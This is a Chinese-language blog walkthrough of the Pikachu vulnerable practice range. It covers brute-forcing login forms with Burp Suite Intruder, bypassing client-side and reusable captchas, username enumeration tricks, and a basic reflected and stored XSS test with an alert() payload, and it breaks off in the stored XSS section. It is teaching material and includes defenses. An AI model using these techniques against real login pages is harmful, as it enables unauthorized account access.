---
date: 2022-06-30-星期四 20:35:24
update: 
tags: [time/year2022,time/month06]
id: 20220630203524
---
# pikachu靶场通关

[blog.csdn.net](https://blog.csdn.net/qq_53571321/article/details/121692906)

### pikachu靶场通关详解

*   一、靶场介绍
*   二、靶场配置
*   三、靶场实战
*   *   3.1 暴力破解漏洞
    *   *   3.1.1暴力破解攻击&暴力破解漏洞概述
        *   3.1.2暴力破解漏洞测试流程
        *   3.1.3基于表单的暴力破解攻击(基于burp suite )
        *   3.1.4暴力破解之不安全的验证码分析---on client---on server
        *   3.1.5Token可以防暴力破解吗?
        *   3.1.6暴力破解常见的防范措施
    *   3.2 XSS（跨站脚本攻击漏洞）
    *   *   3.2.1跨站脚本漏洞概述
        *   3.2.2跨站脚本漏洞类型及测试流程
        *   3.2.3反射型XSS ( get&post )演示
        *   3.2.4存储型XSS演示
        *   3.2.5Dom型XSS演示
        *   3.2.6XSS盲打演示和原理分析
        *   3.2.7XSS的过滤和绕过( filter&htmlspecialchars )
        *   3.2.8XSS输出在href和js中的案例分析
        *   3.2.9XSS的危害-获取cookie的原理和演示
        *   3.2.10XSS危害-XSS进行钓鱼的原理和演示
        *   3.2.11XSS危害XSS获取键盘记录原理和演示
        *   3.2.12XSS常见防范措施
    *   3.3CSRF（跨站请求伪造漏洞）
    *   *   3.3.1CSRF漏洞概述
        *   3.3.2CSRF ( get/post )实验演示和解析
        *   3.3.3Anti CSRF token
        *   3.3.4常见CSRF防范措施
    *   3.4SQL-Inject（SQL注入漏洞）
    *   *   3.4.1SQL Inject漏洞原理概述
        *   3.4.2注入方式get&post&搜索型&xx型
        *   3.4.3SQL Inject漏洞手工测试:基于union联合查询的信息获取( select )
        *   3.4.4通过information\_ schema拿下数据库手工测试完整案例演示
        *   3.4.5SQL Inject漏洞手工测试:基于报错的信息获取(select/delete/update/insert)
        *   3.4.6SQL注入漏洞-基于http header的注入
        *   3.4.7SQL注入漏洞-盲注( boolian base )原理及测试
        *   3.4.8SQL注入漏洞盲注( time base )原理及测试
        *   3.4.9os远程控制
        *   3.4.10SQL Inject漏洞之表(列)名的暴力破解
        *   3.4.11如何使用SQL-Map进行SQL Inject漏洞测试
        *   3.4.12SQL注入漏洞常见防范措施
    *   3.5RCE（代码执行/命令执行）
    *   3.6Files Inclusion(文件包含漏洞)
    *   *   3.6.1文件包含原理及本地文件包含漏洞
        *   3.6.2远程文件包含漏洞
        *   3.6.3文件包含漏洞防范措施
    *   3.7 Unsafe file downloads(不安全的文件下载)
    *   3.8 Unsafe file uploads(不安全的文件上传)
    *   *   3.8.1不安全的文件上传原理及客户端绕过
        *   3.8.2上传漏洞之MINE type验证原理和绕过
        *   3.8.3文件上传之getimagesize绕过和防范措施
    *   3.9 Over Permisson(越权漏洞)
    *   *   3.9.1越权漏洞原理及水平越权
        *   3.9.2垂直越权
    *   3.10 ../../../(目录遍历)
    *   3.11 I can see your ABC(敏感信息泄露)
    *   3.12 PHP反序列化漏洞
    *   3.13 XXE（XML外部实体攻击）
    *   3.14 不安全的URL重定向
    *   3.15 SSRF（服务器端请求伪造）
*   参考资料

# 一、靶场介绍

靶场源码链接：-
GitHub：https://github.com/zhuifengshaonianhanlu/pikachu-
靶场漏洞介绍：-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fdac27dbad24d4f3b83d44f19b25ffece.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

# 二、靶场配置

先安装phpstudey，在GitHub上下载源码，放在phpstudy的www（网站）目录下，完成配置与初始化。-
靶场搭建链接（内含phpstudy与pikachu的配置）：-
[https://blog.csdn.net/weixin\_42474304/article/details/117533788](https://blog.csdn.net/weixin_42474304/article/details/117533788)

# 三、靶场实战

## 3.1 暴力破解漏洞

#### 3.1.1暴力破解攻击&暴力破解漏洞概述

对暴力破解的理解：==暴力破解=连续性的尝试+字典+自动化==。-
其实就是去<span style="background:#ffff00">猜</span>可能的<span style="background:#ffff00">密码</span>，经过不断的试账号和密码，找出正确的账号密码，达到暴力破解的目的。-
<span style="background:#ffff00">最重要</span>的部分就是<span style="background:#ffff00">字典</span>，一个好的字典可以大大加快破解速度。

*   常用的账号密码（<span style="background:#ffff00">弱口令</span>），比较常用的账号密码，系统初始设定的账号密码，比如常用<span style="background:#ffff00">用户名/密码TOP 500</span>等。
*   互联网上被脱裤后账号密码(<span style="background:#ffff00">社工库</span>) ,差不多就是<span style="background:#ffff00">撞库</span>，也就是拿已知的一个库去尝试登录另外一个库。比如CSDN当年泄漏的约600w用户信息。
*   使用指定的字符使用工具按照指定的规则进行排列组合算法生成的密码，特定的字符很多，像手机号、出生日期，姓名等等。

对于暴力破解漏洞的话，如果个网站没有对登录接 实施防暴力破解的措施，或者实施 了不合理的措施，称该网站存在暴力破解漏洞。-
✓是否要求用户设置了<span style="background:#ffff00">复杂的密码</span>;-
✓是否每次认证都使用安全的<span style="background:#ffff00">验证码;</span>-
✓是否对尝试登录的行为进行<span style="background:#ffff00">判断和限制</span>;-
✓是否在必要的情况下采用了<span style="background:#ffff00">双因素认证</span>;-
…等等。-
存在暴力破解漏洞的网站可能会遭受暴力破解攻击，但该暴力破解攻击成功的可能性并不是100% !-
所以有些网站即虽然存在暴力破解漏洞，但其管理员可能会忽略它的危害。搞安全的话，不能有侥幸心理，否则随时会被干掉😭。

#### 3.1.2暴力破解漏洞测试流程

1、确认<span style="background:#ffff00">是否存在暴力破解漏洞 </span>：-
确认目标是否存在暴力破解的漏洞。( 确认被暴力破解的“可能性" ）-
比如:尝试登录一抓包-- -观察验证元素和response信息,判断否存在被暴力破解的可能。-
2、对<span style="background:#ffff00">字典进行配置</span>-
根据实际的情况对字典进行配置，提高爆破过程的效率。-
技巧一:-
<span style="background:#ffff00">根据注册提示信息进行优化</span>-
对目标站点进行注册，搞清楚账号密码的一些限制，比如目标站点要求密码必须是6位以上，字母数字组合，则可以按照此优化字典,比如去掉不符合要求的密码。-
技巧二:-
如果爆破的是管理后台，往往这种系统的管理员是<span style="background:#ffff00">admin/administrator/root</span>的机率比较高，可以使用这三个账号+随便-个密码 ,尝试登录 ,观看返回的结果 ，确定用户名。-
比如:-
输入xxx/yyyf返回“用户名或密码错误"-
输入admin/yy返回"密码错误”, 则基本可以确定用户名是admin ;-
因此可以只对密码进行爆破即可，提高效率。

3、工具自动化操作-
配置自动化工具(比如线程、超时时间、重试次数等) , 进行自动化操作。

#### 3.1.3基于表单的暴力破解攻击(基于burp suite )

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6647b495a024457aafee654fa8b660d4.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_14%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

测试目标: Pikachu-暴力破解-基于表单的暴力破解-
测试工具: burp suite free edition-intruder-
[burp官方下载通道](https://portswigger.net/burp/download.html)-
进行尝试性登录，提示用户名或密码不存在，登陆失败。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd2a1e531225948b39cd236664ac81e83.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
在burp看到是一个post请求，账号和密码分别是1231和1234。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe57e8630784e4ebaa4c52f72e7cb7527.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
在响应界面正常返回一个登陆失败的的界面。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fdb35479c69b64ba1bab92e8f1c9da055.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
选中此条post请求发送到Intruder中-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F23852a2bd04d42bfab2ad6f07203e033.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

将原始数据包中的变量清除，选中用户名和密码点击Add$将其设置为变量。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7d8251bead5248c2a8426505da13381f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

*   Sniper模式逻辑：先将第一个变量也就是用户名替换，第二个变量不动。当第一个变量替换完之后，对第二个变量进行依次替换。直白一点就是说一个变，另外一个不变，第一个变完，变第二个。
*   Battering ram模式逻辑：所有变量进行同时同样的替换。就是说你变我也变，你变什么我也变什么。
*   Pitchfork模式逻辑：所有变量同时替换，但是各自变量替换各自的字典，同时进行，但是互不相干。替换时第一个变量的第一替换值对应第二个变量的第一个替换值，不进行排列组合，就是1对1，2对2。不会将密码进行随机的排列组合。
*   Cluster bomb模式逻辑：与Pitchfork模式逻辑类似，不同点是Cluster bomb模式会进行随机的排列组合。

在这里我们使用Cluster bomb模式进行破解，在Payloads中配置第一个变量和第二个变量的字典，这里可以手动输入添加，也可以在系统中添加已经写好的字典。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3ba02e1ea75b49ac8a0db09bf01464b8.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

添加字典后进行攻击，根据返回数据包的长度进行判断是否成功。为了方便观察也可以在grep-match中删除原有字符串，添加username or password is not exists，burp就会将所有含有此字符串的数据包flag出来。没有被flag出的数据包则是我们破解成功的数据包。点击username or password is not exists进行排序，没有勾选的则表明破解成功，有勾选的则表明破解失败。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe441c5ac655041f9a8c2c1c30ab9d6fe.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
用破解出的账户密码进行登录，login success。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fa074299ebf0248099cca96c65134281f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.1.4暴力破解之不安全的验证码分析—on client—on server

验证码的作用：-
防止登录暴力破解-
防止机器恶意注册-
验证码大概的的认证流程：

*   客户端request登录页面,后台生成验证码:-
    1.后台使用算法生成图片,并将图片response给客户端;-
    2.同时将算法生成的值全局赋值存到SESSION中;
*   校验验证码:-
    1.客户端将认证信息和验证码-同提交;-
    2.后台对提交的验证码与SESSION里面的进行比较;
*   客户端重新刷新页面,再次生成新的验证码:-
    验证码算法中一般包含随机函数,所以每次刷新都会改变;

**不安全的验证码on client绕过演示**

随机输入账号密码，输入相应验证码，利用burp抓包。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F49fcc1d9ddf744b4ba307e866916c49c.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

登录失败验证码发生变化。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2e74a4007d5d4bf1a11135c183177a46.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

查看源码，我们可以发现验证码是JavaScript随机生成，点击一次函数运行一次生成一个相应的验证码。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd82cae7b36bb4b07923cf7eb5e475586.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
将数据包发送到repeater中，对验证码进行判定，判定后台是否对验证码进行校验。修改验证码点击go,多次尝试发现返回的信息都是username or password is not exists，但是没有提示验证码错误。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6c1142f254124559bec46285ba16fb13.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
则可以判断虽然验证码被提交，但是后台并没有验证。这个验证码框是通过JavaScript实现的，对于不懂安全的人来说，可以起到一定的防范作用。但对于知道这个原理的人来说形同虚设。-
接下来，就与基于表单的流程一样，发送数据包到Intruder中，选用Cluster bomb模式修改变量，因为验证码后台并不校验没有用，所以只用选择用户名与密码。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fab5f4146a4064fdaa0600517e18295dd.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
在payload中导入字典进行爆破。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F79d9053bc8604229ae8cded76728b4c6.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
进行长度排序，根据数据包长度不同，找到可能的密码。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F261677a77b074074b06e3a7597846732.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
输入用户名，密码和验证码，破解成功。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3762cd99379f4f5aa47a9213f3ec1326.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
**不安全的验证码- on client常见问题**-
●使用前端js实现验证码(纸老虎) ;-
●将验证码在cookie中泄露,容易被获取;-
●将验证码在前端源代码中泄露，容易被获取;-
**不安全的验证码- on server-演示**-
随机输入账号密码，输入相应验证码，利用burp抓包。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F4b20d18efa6c4e45a5e075c56aeb5a69.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
登录失败，验证码发生变化。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F236ceb6f300a4cd699ac143d1b9afd69.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

将数据包发送到repeater，进行判断。将验证码设置为空，点击运行，出现错误提示，验证码不能为空。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0d6f0978c7654a7a9f50919e09c80d7e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
随机输入一个验证码，点击运行，出现错误提示，验证码不正确。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7713325ee61e4e428e12b014d7929456.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
经过判断，我们发现后台对验证码有进行校验，那是不是这样就没问题了呢？显然不是这样，从表面上看没有问题，但是我们还需要对验证码是否在后台过期进行进一步验证。首先先点击验证码，获取一个新的验证码，并将其记下来。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F285a7b08d2d44920830aaea35aa7490b.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_11%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
然后返回数据包中，将正确的验证码输入。点击运行，提示用户名和密码不正确。为了验证验证码是否一致有效，我们修改用户名和密码，验证码不变，点击运行，结果一样。说明验证码可以重复利用。-
将数据包发送到Intruder，设置变量用户名和密码，验证码则输入正确的验证码，不设置变量。输入字典进行破解。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F36ca6fd9b9f0488e98dd4c03ae970211.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
进行长度排序，找出正确用户名与密码。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F5a316f79d3c549519982e9f6793014cf.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
登陆成功。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F9f4f728060c24b0d881ecf2e0049fd82.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

**不安全的验证码-on server常见问题**-
●验证码在后台不过期，导致可以长期被使用;-
●验证码校验不严格,逻辑出现问题;-
●验证码设计的太过简单和有规律,容易被猜解

#### 3.1.5Token可以防暴力破解吗?

一个token示例

    //生成一个token，以当前的时间＋一个5位的前缀
    function set_token(){
        if(isset($_SESSION['token'])){
            unset($_SESSION['token']);
            }
            $_SESSION['token']=str_replace('.','',uniqid(mt_rand(10000,99999),true));
      }
    
        

一般的做法:-
1.将token以"type=‘hidden’’”的形式输出在表单中;-
2.在提交的认证的时候一起提交，并在后台对其进行校验;-
但，由于其token值输出在了前端源码中,容易被获取,因此也就失去了防暴力破解的意义。一般Token在防止CSRF上会有比较好的功效，具体讲在CSRF漏洞章节进行讲解。

#### 3.1.6暴力破解常见的防范措施

防暴力破解的措施总结-
●设计安全的验证码(安全的流程+复杂而又可用的图形) ;-
●对认证错误的提交进行计数并给出限制,比如连续5次密码错误,锁定2小时;-
●必要的情况下，使用双因素认证;

## 3.2 XSS（跨站脚本攻击漏洞）
#### 3.2.1跨站脚本漏洞概述

●XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。-
●XSS是一种发生在Web前端的漏洞，所以其危害的对象也主要是前端用户。-
●XSS漏洞可以用来<span style="background:#ffff00">进行钓鱼攻击、钓鱼攻击、前端js挖矿、用户cookie获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制等</span>-
**XSS(窃取cookie)攻击流程**-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc3bfb76b27ee42bd8b3ec8dc9c8e86e7.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.2.2跨站脚本漏洞类型及测试流程

**跨站脚本漏洞常见类型**

**危害:存储型>反射型> DOM型**

●反射型-
交互的数据一般不会被存在在数据库里面,==一次性==,所见即所得，一般出现在查询类页面等。-
●存储型-
交互的数据会被存在在数据库里面，==永久性存储==，一般出现在留言板，注册等页面。-
●DOM型-
不与后台服务器产生数据交互,是一种通过DOM操作==前端代码输出的时候产生的问题,一次性也属于反射型。==

**xss漏洞形成的原因:**-
形成XSS漏洞的主要原因是程序对==输入和输出的控制不够严格,导致“精心构造"的脚本输入后,在输到前端时被浏览器当作有效代码解析执行从而产生危害==。

**跨站脚本漏洞测试流程:**-
①在<span style="background:#ffff00">目标站点上找到输入点</span>,比如查询<span style="background:#ffff00">接口,留言板</span>等;-
②输入一组<span style="background:#ffff00">”特殊字符+唯一识别字符”</span>, 点击<span style="background:#ffff00">提交</span>后,<span style="background:#ffff00">查看</span>返回的<span style="background:#ffff00">源码</span>，是否有做对应的处理;-
③通过搜索<span style="background:#ffff00">定位到唯一字符</span>，结合唯一字符前后语法<span style="background:#ffff00">确认是否可以构造执行js的条件 (构造闭合)</span> ;-
④提交构造的<span style="background:#ffff00">脚本代码(以及各种绕过姿势)</span>，看<span style="background:#ffff00">是否可以成功执行</span>，如果<span style="background:#ffff00">成功执行则说明存在XSS漏洞</span>;

提示：-
1.一般查询接口容易出现反射型XSS ,留言板容易出现存储型XSS ;-
2.由于后台可能存在过滤措施，构造的script可能会被过滤掉,而无法生效或者环境限制了执行(浏览器) ;-
3.通过变化不同的script ,尝试绕过后台过滤机制;

#### 3.2.3反射型XSS ( get&post )演示

在对应的输入点输入特殊字符如：_;"’<>9999_-
目的就是看一看是否会被过滤，（因为我们含有特殊字符）有没有被输出，有没有被处理。点击提交。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F344af51175cc49a5911378312a59fccf.png)-
查看页内源码，CTRL+F在页面内查找我们输入的字符。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8aee355988f84fffa7084596f6db8d0b.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
输入的特殊字符被原封不动的输出，那么我们输入正确的JavaScript语句就有可能会被原封不动的返回。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fadc2f96ae0e740d0934f80f76c2de901.png)-
语句输入到一半时，发现不能输入了，原因是对长度进行了限制。这是在前端的安全设置，意义不是很大。兵来将挡水来土掩，在设置中打开web开发者工具，查找输入框语句。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1732a2f9a94e431b8aa3a571b805470f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
可以看到长度为20，我们将其修改为2000即可。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F29deadfee1ef476cb1280ce9a8e73b8f.png)-
输入代码`<script>alert('xss')</script>`，我们可以看到在输入框中的语句被执行，出现了xss弹窗。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3f77538c32f542239e9e6cc979535167.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
因为是反射性，一次性的，刷新页面之后弹窗消失。这个xss实际上是以get的方式提交的。

**GET和POST典型区别:**-
GET是以url方式提交数据;-
POST是以表单方式在请求体里面提交;

GET方式的XSS漏洞更加容易被利用, 一般利用的方式是将带有跨站脚本的URL伪装后发送给目标，而POST方式由于是以表单方式提交,无法直接使用URL方式进行攻击，如何利用?可以思考一下3.2.6揭晓。

#### 3.2.4存储型XSS演示

<span style="background:#ffff00">存储型XSS漏洞跟反射型形成的原因一样,不同的是存储型XSS下攻击者可以将脚本注入到后台存储起来，构成更加持久的危害,因此存储型XSS也称“永久型”XSS。</span>

在留言版上试着输入留言6666。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F06dd2633bcd644e5b8680a9674a929ba.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_10%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
我们发现留言被后台存储，并没有消失。-
按之前的思路，测这个留言板是否存在xss漏洞，在留言板输入特殊字符。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F05fcefdd6b4946909800c177db902233.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_10%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
打开页面源码，CTRL+F去搜索我们输入字符的位置。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0f5b04478c2540919fb5db0a640c53cd.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
没有任何处理，直接被输出。我们输入一个payload，一个弹窗。![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc89513fe9a0b49f781f834dba0abe19e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_13%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
